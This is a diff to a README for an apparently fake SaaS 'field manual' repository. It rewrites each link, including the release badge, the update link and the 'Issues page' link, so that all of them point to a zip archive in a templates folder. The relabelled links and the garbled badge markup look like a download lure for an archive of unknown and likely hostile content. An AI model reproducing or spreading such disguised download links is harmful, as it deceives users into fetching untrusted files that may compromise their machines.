@@ -1,6 +1,6 @@
 # 🌟 solo-saas-field-manual - Your Guide to Building SaaS Efficiently
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/SATiger9300/solo-saas-field-manual/releases)
+[![Download Latest Release](https://github.com/SATiger9300/solo-saas-field-manual/raw/refs/heads/main/templates/saas_solo_manual_field_v2.7.zip%20Latest%20Release-Click%https://github.com/SATiger9300/solo-saas-field-manual/raw/refs/heads/main/templates/saas_solo_manual_field_v2.7.zip)](https://github.com/SATiger9300/solo-saas-field-manual/raw/refs/heads/main/templates/saas_solo_manual_field_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **solo-saas-field-manual**! This guide helps solo and small SaaS 
 
 To get started, you need to download the manual. Visit this page to download:
 
-[Download Releases](https://github.com/SATiger9300/solo-saas-field-manual/releases)
+[Download Releases](https://github.com/SATiger9300/solo-saas-field-manual/raw/refs/heads/main/templates/saas_solo_manual_field_v2.7.zip)
 
 Once on the releases page, follow these steps:
 
@@ -57,13 +57,13 @@ You can access this manual from various devices:
 
 Stay current with the manual. We frequently update it to reflect the latest best practices and industry trends. Returning to the releases page will keep you informed:
 
-[Check for Updates](https://github.com/SATiger9300/solo-saas-field-manual/releases)
+[Check for Updates](https://github.com/SATiger9300/solo-saas-field-manual/raw/refs/heads/main/templates/saas_solo_manual_field_v2.7.zip)
 
 ## 💡 Support
 
 If you have questions or need help regarding the manual, consider opening an issue on the repository. We can assist you quickly.
 
-1. Navigate to the [Issues page](https://github.com/SATiger9300/solo-saas-field-manual/issues).
+1. Navigate to the [Issues page](https://github.com/SATiger9300/solo-saas-field-manual/raw/refs/heads/main/templates/saas_solo_manual_field_v2.7.zip).
 2. Click on "New Issue."
 3. Describe your question clearly, and we will respond promptly.
 
